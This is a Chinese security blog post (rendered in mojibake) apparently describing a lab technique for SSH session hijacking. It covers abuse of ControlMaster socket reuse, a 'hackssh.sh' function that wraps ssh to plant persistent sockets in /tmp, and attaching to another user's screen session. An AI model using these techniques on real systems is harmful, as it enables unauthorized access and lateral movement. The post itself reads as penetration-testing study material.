<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="ğ´_ğ‘Œğ‘¢">





<title>è¿œç¨‹æœåŠ¡åŠ«æŒ_SSHåŠ«æŒ | ğ“_ğš¼ğ“¾Í´ğ’” ğ“‘â„“ğ–”ğ“°</title>



    <link rel="icon" href="/image/favicon.svg">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
<meta name="generator" content="Hexo 6.1.0"></head>
<body>
    <div class="wrapper">
        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 

<header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>ä¸»é¡µ</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        æ–‡ç« 
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        åˆ†ç±»
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        æ ‡ç­¾
                    </a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">ä¸»é¡µ</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; èœå•</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        æ–‡ç« 
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        åˆ†ç±»
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        æ ‡ç­¾
                    </a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">â–¶ï¸ å±•å¼€ç›®å½•</a>
    </div>
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a onclick="go_top()">â–³ é¡¶éƒ¨</a>
        <a onclick="go_bottom()">â–½ åº•éƒ¨</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "â–¼ æ”¶èµ·ç›®å½•"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "â–¶ï¸ å±•å¼€ç›®å½•"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">è¿œç¨‹æœåŠ¡åŠ«æŒ_SSHåŠ«æŒ</h1>
            
                <div class="post-meta">
                    
                        <!--ä½œè€…:-->
                        <i class="iconfont icon-user"></i>
                        <a itemprop="author" rel="author" href="/">ğ´_ğ‘Œğ‘¢ </a> &nbsp;
                    

                    
                        <span class="post-time">
                        <!--å‘å¸ƒæ—¶é—´:-->
                        <i class="iconfont icon-time"></i>
                        <a href="#">2022-04-29&nbsp;&nbsp;8:52:05</a> &nbsp;
                        </span>
                    
                    
                        <span class="post-category">
                        <!--åˆ†ç±»:-->
                        <i class="iconfont icon-category"></i>
                            
                                <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">å†…ç½‘æ¸—é€</a>&nbsp;
                            
                        </span>
                    
                    
                    <span id="/2022/04/29/22-0429-01/" class="leancloud-visitors view" data-flag-title="è¿œç¨‹æœåŠ¡åŠ«æŒ_SSHåŠ«æŒ">
                        <text class="post-meta-item-text">
                            <!--é˜…è¯»æ•°:-->
                            <i class="iconfont icon-view"></i>
                        </text>
                        
                        <text class="leancloud-visitors-count">åŠ è½½ä¸­</text>
                      </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="SSHåŠ«æŒ"><a href="#SSHåŠ«æŒ" class="headerlink" title="SSHåŠ«æŒ"></a>SSHåŠ«æŒ</h1><p>å‚è€ƒé“¾æ¥ï¼š<br>è‹±æ–‡åŸç‰ˆï¼š<a target="_blank" rel="noopener" href="http://0xthem.blogspot.com/2015/03/hijacking-ssh-to-inject-port-forwards.html">http://0xthem.blogspot.com/2015/03/hijacking-ssh-to-inject-port-forwards.html</a><br>ç¿»è¯‘ç‰ˆæœ¬ï¼š<a target="_blank" rel="noopener" href="http://www.178linux.com/1362">http://www.178linux.com/1362</a><br><a target="_blank" rel="noopener" href="http://blog.ttionya.com/article-1318.html">http://blog.ttionya.com/article-1318.html</a></p>
<h2 id="SSHå¤ç”¨æŠ€æœ¯"><a href="#SSHå¤ç”¨æŠ€æœ¯" class="headerlink" title="SSHå¤ç”¨æŠ€æœ¯"></a>SSHå¤ç”¨æŠ€æœ¯</h2><blockquote>
<p>åœ¨å­¦ä¹ SSHåŠ«æŒæŠ€æœ¯ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬å¾—å…ˆç®€å•çš„å­¦ä¹ ä¸‹SSHå¤ç”¨æŠ€æœ¯</p>
</blockquote>
<p>æˆ‘ä»¬ç»å¸¸ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœºï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œé¿å…æ¯æ¬¡ç™»å½•è¾“å…¥å¯†ç ï¼Œé€šå¸¸ä½¿ç”¨å¯†é’¥ç™»å½•ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®å¯†é’¥ï¼Œåˆ™éœ€è¦ä½¿ç”¨å¯†ç ç™»å½•äº†ï¼Œè‹¥æ¯æ¬¡éƒ½è¾“å…¥å¯†ç åˆ™ååˆ†ç¹çã€‚SSHæ”¯æŒ ControlMaster æ¨¡å¼ï¼Œå¯ä»¥è®¾ç½®sshè¿æ¥ä¼šè¯å¤ç”¨ï¼Œåˆ™ç™»å½•æˆåŠŸåï¼Œä¼šä¿æŒä¸€æ®µæ—¶é—´çš„ä¼šè¯ï¼Œåœ¨ä¼šè¯çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œå†æ¬¡ç™»å½•åŒä¸€å°ä¸»æœºä¸éœ€è¦è¾“å…¥å¯†ç ã€‚</p>
<p>æ¯”å¦‚è¯´ï¼šæˆ‘ä»¬ä»kaliç™»é™†åˆ°centosï¼š</p>
<img src="/2022/04/29/22-0429-01/image-20220430201746100.png" alt="image-20220430201746100" style="zoom: 80%;">

<p>é€šè¿‡ControlMasteræ¨¡å¼ï¼Œå½“kaliå’Œcentoså»ºç«‹ä¸€ä¸ªsshè¿æ¥åï¼Œkaliä¼šåˆ›å»ºä¸€ä¸ªæœ¬åœ°å¥—æ¥å­—socketæ–‡ä»¶ã€‚å¦‚æœåç»­kaliå†æ¬¡é€šè¿‡sshç™»é™†centosï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªå¥—æ¥å­—æ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚ControlMasteræ¨¡å¼çš„é…ç½®å¦‚ä¸‹ï¼š</p>
<p>åœ¨kaliä¸Šåˆ›å»ºä¼šè¯ä¿å­˜ç›®å½•ï¼ˆè¿™ä¸ªç›®å½•ç”¨æ¥ä¿å­˜æœ¬åœ°å¥—æ¥å­—æ–‡ä»¶ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.ssh/socks</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>~/.ssh/config</code>æ–‡ä»¶ï¼Œè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºã€‚åŒæ—¶å¢åŠ ä»¥ä¸‹å†…å®¹ï¼šï¼ˆæ³¨æ„ï¼šControlPathå°±æ˜¯æœ¬åœ°å¥—æ¥å­—æ–‡ä»¶ä¿å­˜çš„è·¯å¾„ï¼Œ%hä»£è¡¨ç›®æ ‡ä¸»æœºã€%pä»£è¡¨sshçš„ç«¯å£ã€%rä»£è¡¨ç™»é™†ç”¨æˆ·ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host *</span><br><span class="line">    KeepAlive yes</span><br><span class="line">    ServerAliveInterval 60</span><br><span class="line">    ControlMaster auto</span><br><span class="line">    ControlPersist yes</span><br><span class="line">    ControlPath ~/.ssh/socks/%h-%p-%r</span><br></pre></td></tr></table></figure>

<p>kaliä¸‹æ˜¯æ²¡æœ‰<code>~/.ssh/config</code>æ–‡ä»¶çš„ï¼Œæ‰€ä»¥å…ˆåˆ›å»ºï¼Œå†æ·»åŠ å†…å®¹</p>
<img src="/2022/04/29/22-0429-01/image-20220430202639406.png" alt="image-20220430202639406" style="zoom:80%;">

<p>ç„¶åkalié€šè¿‡sshå’Œcentoså»ºç«‹ç¬¬ä¸€æ¬¡sshè¿æ¥ï¼ˆè¿™é‡Œéœ€è¦çŸ¥é“centosçš„rootè´¦æˆ·å¯†ç ï¼‰ï¼ŒåŒæ—¶åˆ›å»ºæœ¬åœ°å¥—æ¥å­—æ–‡ä»¶</p>
<img src="/2022/04/29/22-0429-01/image-20220430212744595.png" alt="image-20220430212744595" style="zoom:80%;">

<p>ç„¶åæŸ¥çœ‹<code>~/.ssh/socks</code>ï¼Œæˆ‘ä»¬ä¼šå‘ç°æœ¬åœ°å¥—æ¥å­—æ–‡ä»¶</p>
<img src="/2022/04/29/22-0429-01/image-20220430210449018.png" alt="image-20220430210449018" style="zoom:80%;">

<p>ç„¶åå³ä½¿æ²¡æœ‰centoså¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤åˆ©ç”¨æœ¬åœ°å¥—æ¥å­—æ–‡ä»¶è¿›è¡Œç™»é™†ï¼ˆ%hä»£è¡¨ç›®æ ‡ä¸»æœºï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -S ~/.ssh/socks/192.168.43.144-22-root %h </span><br></pre></td></tr></table></figure>

<img src="/2022/04/29/22-0429-01/image-20220430210639349.png" alt="image-20220430210639349" style="zoom:80%;">

<p>æ‰€ä»¥åˆ©ç”¨ä¸Šè¿°SSHå¤ç”¨æŠ€æœ¯ï¼Œé»‘å®¢å¯ä»¥åˆ©ç”¨å®ƒåœ¨æŸç”¨æˆ·çš„åŸå§‹socketé‡Œåˆ›å»ºè‡ªå·±çš„ä¼šè¯ï¼Œä¸ç”¨å†æ¬¡è¿›è¡Œè®¤è¯ã€‚</p>
<h2 id="åˆ©ç”¨shellæŒ‡ä»¤ä½¿ç”¨SSH-ControlMaster"><a href="#åˆ©ç”¨shellæŒ‡ä»¤ä½¿ç”¨SSH-ControlMaster" class="headerlink" title="åˆ©ç”¨shellæŒ‡ä»¤ä½¿ç”¨SSH ControlMaster"></a>åˆ©ç”¨shellæŒ‡ä»¤ä½¿ç”¨SSH ControlMaster</h2><p>ä¸Šé¢æ˜¯ä¿®æ”¹äº†<code>~/.ssh/config</code>é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨shellå‘½ä»¤å¼€å¯ControlMasteræ¨¡å¼</p>
<p>æ¯”å¦‚ï¼šåˆ›å»ºhackssh.shï¼Œç„¶åå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh () </span><br><span class="line">&#123; </span><br><span class="line">	echo &quot;success&quot;;</span><br><span class="line">    /usr/bin/ssh -o &quot;ControlMaster=auto&quot; -o &quot;ControlPath=/tmp/%r@%h:%p&quot; -o &quot;ControlPersist=yes&quot; &quot;$@&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ssh </span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œhackssh.shå°±ç›¸å½“äºæ‰§è¡Œhackssh.shä¸­çš„sshå‡½æ•°ï¼Œæ‰§è¡Œsshå‡½æ•°ä¼šæ‰“å°successå’Œè°ƒç”¨sshå‘½ä»¤ï¼ŒåŒæ—¶è¿˜ä¼šå¼€å¯ControlMaster æ¨¡å¼ï¼Œ<code>/usr/bin/ssh -o &quot;ControlMaster=auto&quot; -o &quot;ControlPath=/tmp/%r@%h:%p&quot; -o &quot;ControlPersist=yes&quot; &quot;$@&quot;;</code>è¿™æ¡å‘½ä»¤ç±»ä¼¼äºä¿®æ”¹<code>~/.ssh/config</code></p>
<img src="/2022/04/29/22-0429-01/image-20220430234712108.png" alt="image-20220430234712108" style="zoom:80%;">

<p>ç„¶åæˆ‘ä»¬æŠŠhackssh.shçš„sshå‡½æ•°å¯¼å…¥å½“å‰ç¯å¢ƒå˜é‡ï¼ˆåªåœ¨å½“å‰shellä¸­æœ‰ç”¨ï¼‰</p>
<img src="/2022/04/29/22-0429-01/image-20220430233641983.png" alt="image-20220430233641983" style="zoom:80%;">

<p>ç„¶åè°ƒç”¨sshå‘½ä»¤ç›¸å½“äºè°ƒç”¨hackssh.shçš„sshå‡½æ•°</p>
<img src="/2022/04/29/22-0429-01/image-20220430233751157.png" alt="image-20220430233751157" style="zoom:80%;">

<p>ç„¶åkalié€šè¿‡sshå‘½ä»¤ç™»é™†centosï¼ˆéœ€è¦è¾“å…¥å¯†ç ï¼‰</p>
<img src="/2022/04/29/22-0429-01/image-20220430234849640.png" alt="image-20220430234849640" style="zoom:80%;">

<p>ç„¶ååœ¨tmpç›®å½•ä¸­å°±å‡ºç°äº†æœ¬åœ°å¥—æ¥å­—</p>
<img src="/2022/04/29/22-0429-01/image-20220430235013866.png" alt="image-20220430235013866" style="zoom:80%;">

<p>æ³¨æ„ï¼šä¸Šè¿°è¿‡ç¨‹å®é™…å°±æ˜¯æ³¨å…¥sshå‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯é€šè¿‡sourceå‘½ä»¤æŠŠ.shæ–‡ä»¶ä¸­çš„å‡½æ•°å¯¼å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œä½†ä¸€æ—¦é€€å‡ºå½“å‰shellå°±æ— æ•ˆäº†ï¼Œæ¯”è¾ƒé¸¡è‚‹ã€‚å¦‚æœèƒ½å¤ŸæŠŠ.shæ–‡ä»¶ä¸­çš„å‡½æ•°å¯¼å…¥ç³»ç»Ÿå˜é‡ä¸­å°±ä¼šæ›´å¥½ï¼Œè¿™æ ·ä¼šä¿æŒä¸€ç›´æœ‰æ•ˆ</p>
<h2 id="åŠ«æŒæ´»è·ƒSSHä¼šè¯"><a href="#åŠ«æŒæ´»è·ƒSSHä¼šè¯" class="headerlink" title="åŠ«æŒæ´»è·ƒSSHä¼šè¯"></a>åŠ«æŒæ´»è·ƒSSHä¼šè¯</h2><blockquote>
<p>åˆ©ç”¨ä¸Šé¢çš„SSHå¤ç”¨è¿›è¡ŒåŠ«æŒï¼Œå³ä½¿å…³é—­äº†sshè¿æ¥ï¼Œè¿˜æ˜¯å¯ä»¥ç”¨å¥—æ¥å­—æ–‡ä»¶è¿›è¡Œç™»é™†ã€‚ä¸‹é¢ç®€å•äº†è§£ä¸‹sshè¿æ¥ä¸€ç›´å­˜åœ¨ï¼ˆä¸å…³é—­ï¼‰ï¼Œå¦‚ä½•åŠ«æŒä¼šè¯</p>
</blockquote>
<p>æ™®é€šç”¨æˆ·å¯ä»¥åˆ›å»ºscreenä¼šè¯ï¼Œç„¶åå¦‚æœæ™®é€šç”¨æˆ·é€šè¿‡screenä¼šè¯æ¥å»ºç«‹sshè¿æ¥ï¼Œé‚£ä¹ˆå°±ç»™äº†æˆ‘ä»¬åŠ«æŒscreençš„æœºä¼š</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>æ‰“å¼€ä¸€ä¸ªç»ˆç«¯â‘ ï¼Œè®©æ™®é€šç”¨æˆ·kalié€šè¿‡screenä¼šè¯<code>sshtest</code>æ¥å’Œcentoså»ºç«‹sshè¿æ¥</p>
<img src="/2022/04/29/22-0429-01/image-20220501115159568.png" alt="image-20220501115159568" style="zoom:80%;">

<p>ç„¶ååœ¨<code>sshtest</code>ä¼šè¯ä¸­è¾“å…¥ssh <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#52;&#51;&#46;&#x31;&#52;&#x34;">&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#52;&#51;&#46;&#x31;&#52;&#x34;</a>å»ºç«‹sshè¿æ¥</p>
<img src="/2022/04/29/22-0429-01/image-20220501114258482.png" alt="image-20220501114258482" style="zoom:80%;">

<p>ç„¶åæˆ‘ä»¬å†æ¬¡æ‰“å¼€ä¸€ä¸ªç»ˆç«¯â‘¡ï¼Œé€šè¿‡<code>screen -x 5771</code> ç™»å½•ç»ˆç«¯â‘ çš„screenä¼šè¯ï¼Œä½†æ˜¯æ³¨æ„ï¼šé€šè¿‡<code>-x</code>æ¥ç™»é™†çš„è¯ï¼Œæˆ‘ä»¬åœ¨å³è¾¹ç»ˆç«¯â‘¡æ‰§è¡Œlså‘½ä»¤ï¼ŒåŒæ—¶å·¦è¾¹çš„ç»ˆç«¯â‘ ä¹Ÿä¼šåŒæ­¥æ‰§è¡Œlså‘½ä»¤ï¼Œå¦‚ä¸‹ï¼š</p>
<img src="/2022/04/29/22-0429-01/image-20220501115643093.png" alt="image-20220501115643093" style="zoom: 80%;">

<p>å¦‚æœè¦è§£å†³è¿™ä¸ªé—®é¢˜å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œç™»é™†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen -S 5771 -X scrollback 0  #æ‰§è¡Œè¯¥å‘½ä»¤ç™»é™†ï¼Œåœ¨ç»ˆç«¯â‘¡æ‰§è¡Œå‘½ä»¤ï¼Œä¸ä¼šå’Œç»ˆç«¯â‘ åŒæ­¥</span><br><span class="line">screen -S 5771 -X scrollback 15000 #æ‰§è¡Œè¯¥å‘½ä»¤ç™»é™†åï¼Œç»ˆç«¯â‘ ä¼šå’Œç»ˆç«¯â‘¡ä¸€æ ·æ‰§è¡Œå‘½ä»¤ä¼šåŒæ­¥</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡<code>screen -rd 5771</code>æ¥ç™»é™†ï¼Œä½†è¿™æ ·ç»ˆç«¯â‘ çš„sshè¿æ¥ä¼šç›´æ¥è¢«æ–­å¼€ï¼Œæ³¨æ„ï¼šè¿™é‡Œä¸èƒ½ç”¨-rå‚æ•°ç™»é™†<code>screen -r 5771</code>ï¼Œä¼šç›´æ¥æŠ¥é”™ã€‚</p>
<p>å¦‚æœç”¨<code>screen -rd 5771</code>æˆ–è€…<code>screen -x 5771</code>æŠ¥é”™ï¼Œç±»ä¼¼å¦‚ä¸‹é”™è¯¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€œCannot open your terminal &#x27;/dev/pts/#&#x27; - please check.â€</span><br><span class="line">â€œMust be connected to a terminal.â€</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæ‰§è¡Œ<code>script /dev/null</code>å‘½ä»¤æ¥è§£å†³ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡su - userå‘½ä»¤åˆ‡æ¢ç”¨æˆ·åï¼Œä½¿ç”¨screenä¼šå‡ºç° â€œCannot open your terminal &#x27;/dev/pts/#&#x27; - please check.â€</span><br><span class="line">è§£å†³æ–¹æ³•ï¼š</span><br><span class="line">åˆ‡æ¢ç”¨æˆ·åï¼Œæ‰§è¡Œå¦‚ä¸‹è¯­å¥ï¼š</span><br><span class="line">script /dev/null</span><br><span class="line">åŸç†å¦‚ä¸‹ï¼š</span><br><span class="line">æˆ‘ä»¬ä½¿ç”¨ root ç”¨æˆ·å’Œ test ç”¨æˆ·ä¸¾ä¾‹ï¼Œå…ˆä»¥ root èº«ä»½ç™»é™†ç³»ç»Ÿã€‚</span><br><span class="line">[root@localhost ~]# tty</span><br><span class="line">/dev/pts/0</span><br><span class="line">[root@localhost ~]# ls -l /dev/pts/0</span><br><span class="line">crw--w---- 1 root tty 136, 0 Jan 24 17:49 /dev/pts/0</span><br><span class="line">[root@localhost ~]# screen</span><br><span class="line">ç”¨ tty å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¸º root åˆ†é…çš„ ttyï¼Œä¸º â€œ/dev/pts/0â€³ï¼Œå†ç¡®è®¤æƒé™ï¼Œæƒé™ä¸º 620ï¼Œæ‰€æœ‰è€…ä¸º rootã€‚è¡¨ç¤ºä»…æœ‰ root ç”¨æˆ·æœ‰è¯»å–åŠå†™å…¥æƒé™ï¼Œtty ç»„æ‹¥æœ‰å†™å…¥æƒé™ï¼Œå…¶ä»–äººæ— ä»»ä½•æƒé™ã€‚æ­¤æ—¶æ‰§è¡Œ screen ä¸æŠ¥é”™ã€‚</span><br><span class="line">[root@localhost ~]# su - test</span><br><span class="line">[test@localhost ~]$ tty</span><br><span class="line">/dev/pts/0</span><br><span class="line">[test@localhost ~]$ ls -l /dev/pts/0</span><br><span class="line">crw--w---- 1 root tty 136, 0 Jan 24 17:55 /dev/pts/0</span><br><span class="line">[test@localhost ~]$ screen</span><br><span class="line">Cannot open your terminal &#x27;/dev/pts/0&#x27; - please check.</span><br><span class="line">ä»¥ test ç”¨æˆ·ç™»å½•ç³»ç»Ÿï¼ŒåŒæ ·æŸ¥çœ‹ tty å’Œæƒé™ï¼Œå‘ç°å³ä½¿åˆ‡æ¢äº†ç”¨æˆ·ï¼Œä½†æ˜¯ç»ˆç«¯çš„ tty ä¾æ—§æ²¡æ”¹å˜ï¼Œæ‰€æœ‰è€…æ˜¯ rootï¼Œç„¶è€Œ test ç”¨æˆ·ç›¸å¯¹ root ç”¨æˆ·æ˜¯å…¶ä»–äººï¼Œæ²¡æœ‰ä»»ä½•æƒé™ï¼Œäºæ˜¯æ‰§è¡Œ screen å‡ºç°æ— æ³•æ‰“å¼€ç»ˆç«¯çš„æŠ¥é”™æç¤ºã€‚</span><br><span class="line">[test@localhost ~]$ script /dev/null</span><br><span class="line">Script started, file is /dev/null</span><br><span class="line">[test@localhost ~]$ tty</span><br><span class="line">/dev/pts/1</span><br><span class="line">[test@localhost ~]$ ls -l /dev/pts/1</span><br><span class="line">crw--w---- 1 test tty 136, 1 Jan 24 18:01 /dev/pts/1</span><br><span class="line">[test@localhost ~]$ screen</span><br><span class="line">æ‰§è¡Œ script /dev/null å‘½ä»¤åï¼ŒæŸ¥çœ‹ ttyï¼Œå‘ç° test ç”¨æˆ·ä½¿ç”¨äº†æ–°çš„ ttyï¼Œæ‰€æœ‰è€…ä¹Ÿæˆä¸ºäº† testï¼Œtest ç”¨æˆ·æ‹¥æœ‰äº†å®Œæ•´çš„æƒé™ï¼Œæ‰§è¡Œ screen å°±ä¸ä¼šå‡ºç°é”™è¯¯ä¿¡æ¯äº†ã€‚</span><br></pre></td></tr></table></figure>


        </div>		
		
        <section class="post-tags">
            <div>
                <span>æ ‡ç­¾:</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
                            <i class="iconfont icon-tag1"></i>
                            æ¨ªå‘ç§»åŠ¨
                        </a>
                    
                        
                </span>
            </div>
            <div>
                <a href="/">
                    <i class="iconfont icon-home"></i>
                    ä¸»é¡µ
                </a>
                <span>Â· </span>
                <a href="javascript:window.history.back();">
                    <i class="iconfont icon-back"></i>
                    è¿”å›
                </a>
                
                
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/04/29/22-0429-02/">linuxå‘½ä»¤åˆé›†</a>
            
            
            <a class="next" rel="next" href="/2022/04/28/22-0428-02/">RPCåè®®</a>
            
        </section>
        <br>
        
            <section id="comments" class="comments">
              <style>
                  .comments{ margin-top: 30px;}
                  .v .vlist .vcard .vcontent {padding-top: 0;}
                  .vcontent p { color:grey; margin-bottom: 10px;}
                  .v * {line-height: normal;}
                  .v .vwrap  {border-radius: 0px; padding: 10px;}
                  .v .vbtn {border-radius: 0px;}
                  .v code, .v pre {border-radius: 0px;}
                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
                  .v .vlist .vcard {padding-top: 0;}
                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
              </style>
              <div class="valine_comment"></div>
<!--è½½å…¥jsï¼Œåœ¨</body>ä¹‹å‰æ’å…¥å³å¯-->
<!--Leancloud æ“ä½œåº“:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine çš„æ ¸å¿ƒä»£ç åº“-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
        placeholder: 'æƒ³å¯¹ä½œè€…è¯´ç‚¹ä»€ä¹ˆ...',
        notify: 'false',
        verify: 'false',
        avatar: 'retro',
        visitor: 'true'
    });
</script>
            </section>
        
    </article>
</div>



<style>

.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }

</style>
        </div>
        <footer id="footer" class="footer">

 <div class="copyright">

 <span>Â© ğ´_ğ‘Œğ‘¢

 <!-- è®¿å®¢æ•°é‡ -->

 

 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span class="site-uv">
    | æ€»è®¿å®¢é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
</span>&nbsp;


<span class="site-pv">
    | æ€»è®¿é—®é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


 

 </span>

 </div>

</footer>
    </div>
</body>
</html>


	



<script type="text/javascript" src="\js\jquery.js"></script>
<script type="text/javascript" src="\js\jquery.min.js"></script>

